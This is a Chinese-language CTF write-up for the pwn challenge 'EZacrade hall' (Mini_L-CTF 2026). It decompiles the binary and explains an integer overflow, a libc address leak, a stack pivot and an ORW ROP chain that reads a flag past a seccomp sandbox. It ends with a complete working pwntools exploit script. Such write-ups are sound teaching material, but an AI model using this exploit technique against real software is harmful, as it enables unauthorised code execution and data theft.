---
title: "[Mini_L-CTF 2026]EZacrade hall Writeup"
date: 2026-10-10 23:58:00
mathjax: true
categories:
  - pwn
tags:
  - pwn
  - 栈迁移
  - ORW
  - Mini_L-CTF
---

# [Mini_L-CTF 2026]EZacrade hall Writeup

非常值得记录的一道题，融合了很多技巧

## 题目分析与攻击思路

查看保护

![checksec 结果](/img/ezacrade-hall/checksec.png)

![L-ARCADE 程序界面](/img/ezacrade-hall/arcade.png)

这道题保护全开，同时开启了沙箱，需要使用orw技术绕过。

再看IDA反汇编

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  const char *v4; // rdx
  const char *v5; // rdx
  const char *v6; // rdx
  size_t v7; // rax
  int v8; // ecx
  const char *buf; // [rsp+8h] [rbp-F8h]
  int v10; // [rsp+2Ch] [rbp-D4h] BYREF
  int v11; // [rsp+30h] [rbp-D0h] BYREF
  _QWORD *v12; // [rsp+38h] [rbp-C8h]
  _QWORD v13[24]; // [rsp+40h] [rbp-C0h] BYREF

  v13[17] = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  signal(14, timeout_handler);
  alarm(0x78u);
  memset(cartridges, 0, 0x80u);
  __snprintf_chk(
    cartridges,
    128,
    1,
    640,
    "L-ARCADE diagnostics\nrenderer: %p\nvideo path: stable\nservice console: ready\n",
    &puts);
  fill_cart(1, "Super Luigi Bros.\nWorld 1-1 loaded.\nTip: jump first, ask questions later.");
  fill_cart(2, "Contra Reloaded\nTwo players ready.\nSpread gun acquired.");
  fill_cart(3, "Tetromino Stack\nScore attack mode.\nNext piece: T");
  fill_cart(4, "PAC-MAN DX\nGhosts released.\nCherry bonus active.");
  v13[3] = 0x101000015LL;
  v13[5] = 0x10101000015LL;
  v13[2] = 0x7FFF000000000006LL;
  v13[4] = 0x7FFF000000000006LL;
  v13[6] = 0x7FFF000000000006LL;
  v13[7] = 0x301000015LL;
  v13[8] = 0x7FFF000000000006LL;
  v13[10] = 0x7FFF000000000006LL;
  v13[12] = 0x7FFF000000000006LL;
  v13[14] = 0x7FFF000000000006LL;
  v13[9] = 0x3C01000015LL;
  v13[15] = 0x8000000000000006LL;
  v13[11] = 0xE701000015LL;
  LOWORD(v11) = 16;
  v12 = v13;
  v13[0] = 32;
  v13[1] = 16777237;
  v13[13] = 0xF01000015LL;
  if ( prctl(38, 1, 0, 0, 0) || prctl(22, 2, &v11) )
LABEL_49:
    _exit(1);
  puts("Welcome to the arcade zone.");
  while ( 1 )
  {
    while ( 1 )
    {
      puts("\n[Menu]");
      puts("1. View cabinet");
      puts("2. Buy tokens");
      puts("3. Insert cartridge");
      puts("4. Run game");
      puts("5. Eject cartridge");
      puts("6. View screen");
      puts("7. Staff service");
      puts("8. View status");
      puts("9. Quit");
      if ( (unsigned int)read_u32("> ", &v10) )
        break;
LABEL_37:
      puts("Invalid input.");
    }
    switch ( v10 )
    {
      case 1:
        puts("+----------------------------------+");
        puts("|       L-ARCADE CLASSIC           |");
        puts("+----------------------------------+");
        puts("| #1 [Super Luigi Bros.]           |");
        puts("| #2 [Contra Reloaded]             |");
        puts("| #3 [Tetromino Stack]             |");
        puts("| #4 [PAC-MAN DX]                  |");
        puts("+----------------------------------+");
        continue;
      case 2:
        if ( !(unsigned int)read_u32("Buy tokens> ", &v11) )
          goto LABEL_37;
        v8 = 5 * v11;
        if ( 5 * v11 > (unsigned int)gold )
        {
          puts("Not enough gold!");
        }
        else
        {
          tokens += v11;
          gold -= v8;
          __printf_chk(1, "Purchased %u tokens for %u gold.\n", v11, v8);
        }
        continue;
      case 3:
        if ( tokens )
        {
          if ( !(unsigned int)read_u32("Choose cartridge (1-4)> ", &v11) )
            goto LABEL_37;
          if ( (unsigned int)(v11 - 1) > 3 )
          {
            puts("Invalid cartridge.");
          }
          else
          {
            --tokens;
            dword_4304 |= 1u;
            machine = v11;
            __printf_chk(1, "Cartridge #%u inserted.\n", v11);
          }
        }
        else
        {
          puts("Buy some tokens first!");
        }
        continue;
      case 4:
        if ( (dword_4304 & 1) != 0 )
        {
          if ( (unsigned int)(machine - 1) > 3 )
          {
            puts("Cartridge fault detected. Call staff.");
          }
          else if ( (unsigned int)tokens <= 4 )
          {
            puts("Not enough tokens (5 per run)!");
          }
          else
          {
            tokens -= 5;
            dword_4304 |= 2u;
            puts("Booting game...");
            puts(&cartridges[128 * (unsigned __int64)(unsigned int)machine]);
          }
        }
        else
        {
          puts("Insert a cartridge first!");
        }
        continue;
      case 5:
        if ( (dword_4304 & 1) != 0 )
        {
          if ( (unsigned int)tokens <= 0x63 )
          {
            puts("Service eject requires 100 tokens.");
          }
          else
          {
            machine = 0;
            tokens -= 100;
            dword_4304 &= ~1u;
            puts("Cartridge ejected.");
          }
        }
        else
        {
          puts("No cartridge is inserted.");
        }
        continue;
      case 6:
        if ( (dword_4304 & 2) != 0 )
        {
          if ( !machine )
            dword_4304 |= 4u;
          puts("Current screen:");
          buf = &cartridges[128 * (unsigned __int64)(unsigned int)machine];
          v7 = strnlen(buf, 0x80u);
          if ( write(1, buf, v7) < 0 )
            goto LABEL_49;
          putc(10, stdout);
          if ( (dword_4304 & 4) != 0 )
            puts("[Service console unlocked]");
        }
        else
        {
          puts("No video signal.");
        }
        break;
      case 7:
        if ( (dword_4304 & 4) != 0 )
        {
          maintenance_console();
          puts("Service console closed.");
        }
        else
        {
          puts("Service console is locked.");
        }
        continue;
      case 8:
        puts("\n[Machine Status]");
        __printf_chk(1, "Gold: %u\n", gold);
        __printf_chk(1, "Tokens: %u\n", tokens);
        v4 = "inserted";
        if ( (dword_4304 & 1) == 0 )
          v4 = "empty";
        __printf_chk(1, "Cartridge: %s\n", v4);
        v5 = "online";
        if ( (dword_4304 & 2) == 0 )
          v5 = "offline";
        __printf_chk(1, "Video: %s\n", v5);
        v6 = "unlocked";
        if ( (dword_4304 & 4) == 0 )
          v6 = "locked";
        __printf_chk(1, "Service: %s\n", v6);
        continue;
      case 9:
        puts("See you next time.");
        return 0;
      default:
        puts("No such option.");
        continue;
    }
  }
}


__int64 maintenance_console()
{
  _BYTE v1[32]; // [rsp+30h] [rbp-60h] BYREF
  __int64 v2; // [rsp+50h] [rbp-40h] BYREF

  __memset_chk(v1, 0, 96, -1);
  puts("\n== Maintenance Console ==");
  __printf_chk(1, "service cursor: %p\n", &v2);
  puts("upload cached pattern before calibration.");
  cache_pattern(v1, 96);
  puts("apply tone calibration to leave service mode.");
  calibrate_speaker();
  leave_service_mode();
  return leave_service_mode();
}


int calibrate_speaker()
{
  unsigned __int64 v0; // r8
  char *v1; // r10
  __int64 v2; // r9
  __int64 v3; // rax
  __int64 v4; // r8
  char v6; // [rsp+0h] [rbp-30h] BYREF

  puts("tone profile>");
  v0 = 0;
  v1 = &v6;
  v2 = 50;
  do
  {
    v3 = sys_read(0, &v1[v0], v2 - v0);
    if ( v3 <= 0 )
      _exit(0);
    v0 = v3 + v4;
  }
  while ( v0 <= 0x31 );
  return puts("speaker calibration saved.");
}
```

这道题的大概逻辑就是：最开始玩家可以用金币购买token，使用token完成一系列操作，每完成一个操作就会有一个flag来记录你的状态，如果最终`flag & 4 != 0`，即可进入后台。

显然，金币是不够的，这需要我们去思考如何获取足够多的token

```C
if ( !(unsigned int)read_u32("Buy tokens> ", &v11) )
	goto LABEL_37;
v8 = 5 * v11;
if ( 5 * v11 > (unsigned int)gold )
{
	puts("Not enough gold!");
}
```

观察这里，`v11`是一个无符号32位整数，溢出后会对$2^{32}$取模作为其真实值，我们可以输入`str((2 ** 32 + 4) // 5).encode()`来获取足够多的金币（值得注意的是，在`read_u32()`函数中使用了`strtoul()`，因此我们需要使用十进制数转化为字符串再解码进行输入）

获取到了足够多的金币后，后面的问题也就迎刃而解了



### how2leak_libc

注意到

```C
  __snprintf_chk(
    cartridges,
    128,
    1,
    640,
    "L-ARCADE diagnostics\nrenderer: %p\nvideo path: stable\nservice console: ready\n",
    &puts);
  fill_cart(1, "Super Luigi Bros.\nWorld 1-1 loaded.\nTip: jump first, ask questions later.");
  fill_cart(2, "Contra Reloaded\nTwo players ready.\nSpread gun acquired.");
  fill_cart(3, "Tetromino Stack\nScore attack mode.\nNext piece: T");
  fill_cart(4, "PAC-MAN DX\nGhosts released.\nCherry bonus active.");
```

选项6会输出`cartridges`，接收到`puts`的真实地址（这里真的需要注意力集中啊）



### how2rop

在管理员中，泄露了`stack`的地址，不难猜到这是在提示我们进行栈迁移

```C
__int64 maintenance_console()
{
  _BYTE v1[32]; // [rsp+30h] [rbp-60h] BYREF
  __int64 v2; // [rsp+50h] [rbp-40h] BYREF

  __memset_chk(v1, 0, 96, -1);
  puts("\n== Maintenance Console ==");
  __printf_chk(1, "service cursor: %p\n", &v2);
  puts("upload cached pattern before calibration.");
  cache_pattern(v1, 96);
  puts("apply tone calibration to leave service mode.");
  calibrate_speaker();
  leave_service_mode();
  return leave_service_mode();
}
```

`maintenance_console()`中，我们最多只能覆盖`0x60`字节，无法修改`rbp`和返回地址

继续观察

```C
int calibrate_speaker()
{
  unsigned __int64 v0; // r8
  char *v1; // r10
  __int64 v2; // r9
  __int64 v3; // rax
  __int64 v4; // r8
  char v6; // [rsp+0h] [rbp-30h] BYREF

  puts("tone profile>");
  v0 = 0;
  v1 = &v6;
  v2 = 50;
  do
  {
    v3 = sys_read(0, &v1[v0], v2 - v0);
    if ( v3 <= 0 )
      _exit(0);
    v0 = v3 + v4;
  }
  while ( v0 <= 0x31 );
  return puts("speaker calibration saved.");
}
```

这个函数允许我们修改`0x32`字节！

函数`leave_service_mode()`中就是`leave; ret`的汇编

```assembly
.text:0000000000001AA0 leave_service_mode proc near            ; CODE XREF: maintenance_console+B6↑p
.text:0000000000001AA0 ; __unwind {
.text:0000000000001AA0                 leave
.text:0000000000001AA1                 retn
.text:0000000000001AA1 leave_service_mode endp
```

在`calibrate_speaker()`结束时会`leave; ret`一次，`calibrate_speaker()`的返回地址是`call leave_service_mode()`，两次`leave; ret`，很显然的栈迁移。

那么思路就很明显了，我们使用这多出来的两个字节将rbp修改到`maintenance_console()`中布置好的rop上，就完成了栈迁移。

需要注意的是`maintenance_console()`的`0x60`个字节显然不够我们orw，这需要构造一个`read`的rop进行reread



完整攻击脚本如下

```python
#!/usr/bin/env python3
from pwn import *

filename = "chall1_patched"
libcname = "/home/starno/.config/cpwn/pkgs/2.35-0ubuntu3.13/amd64/libc6_2.35-0ubuntu3.13_amd64/lib/x86_64-linux-gnu/libc.so.6"
host = "127.0.0.1"
port = 57046
container_id = ""
proc_name = ""
elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)
gs = '''
b *$rebase(0x1A8C)
set debug-file-directory /home/starno/.config/cpwn/pkgs/2.35-0ubuntu3.13/amd64/libc6-dbg_2.35-0ubuntu3.13_amd64/usr/lib/debug

'''
context(log_level = 'debug', os = 'linux', arch = 'amd64')

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process(elf.path)

p = start()

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num                :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
ia      = lambda                    :p.interactive()
ls      = lambda delim, data        :log.success(delim + f' : {hex(data)}')

def dbg(gs = ''):
    gdb.attach(p, gdbscript=gs)

#exploit

def exp():


    sla(b'> ', b'2')
    sla(b'Buy tokens> ', str((2 ** 32 + 4) // 5).encode())
    sla(b'> ', b'3')
    sla(b'> ', b'4')
    sla(b'> ', b'4')
    sla(b'> ', b'5')
    sla(b'> ', b'6')
    ru(b'renderer: ')
    puts = int(r(14), 16)
    base = puts - libc.sym['puts']
    ls("libc_base", base)

    sla(b'> ', b'7')
    ru(b'service cursor: ')
    stack = int(r(14), 16)
    rsp = stack - 0x50
    rbp = stack + 0x40
    v1 = rsp + 0x30

    sla(b'pattern length> ', b'96')
    rsi = base + 0x2be51
    rdx_r12 = base + 0x11f367
    ret = base + 0x29139
    rdi = base + 0x2a3e5
    pop_rsp = base + 0x35732 
    read = base + libc.sym['read']
    openat = base + libc.sym['openat']
    write = base + libc.sym['write']
    buff_addr = v1 - 0x400
    ls("buff", buff_addr)

    payload = flat(
        b'a' * 8,
        rdi, 0, 
        rsi, buff_addr, 
        rdx_r12, 0x300, 0, read,
        pop_rsp, buff_addr                      # important : move rsp to buff
    ).ljust(0x60, b'\x00')
    sa(b'pattern data> ', payload)
    bss = buff_addr + 0x120
    now = buff_addr + 0x320

    payload = flat(
        b'a' * 0x30,
        p16(v1 & 0xffff)
    )
    sa(b'tone profile>\n', payload)

    stage = flat(
        rdi, -100,
        rsi, bss,
        rdx_r12, 0, 0, 
        ret,
        openat,

        rdi, 3,
        rsi, now,
        rdx_r12, 0x40, 0,
        ret,
        read,

        rdi, p64(1),
        rsi, p64(now),
        rdx_r12, p64(0x40), 0,
        ret,
        write
    ).ljust(0x120, b'\x00')
    stage += b'./flag\x00\x00'
    stage = stage.ljust(0x300, b'\x00')
    s(stage)

#dbg(gs = gs)
exp()
p.interactive()
```

